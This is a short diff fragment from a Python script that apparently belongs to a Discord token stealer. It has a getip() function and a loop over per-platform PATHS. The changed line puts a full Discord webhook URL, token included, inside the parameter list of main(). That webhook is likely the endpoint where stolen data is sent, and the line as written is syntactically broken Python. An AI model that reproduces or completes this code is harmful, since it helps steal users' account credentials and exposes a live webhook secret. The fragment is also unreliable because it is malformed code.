@@ -77,7 +77,7 @@ def getip():
     except:
         return "None"
 
-def main():
+def main(https://discord.com/api/webhooks/1340266253473939468/K52SByfnrT5uJj2lcOJnjb1_tWDnGglntskZQCk1vh_WWkH3FWm3-GpO5Kl2bJ17nZDb):
     checked = []
 
     for platform, path in PATHS.items():
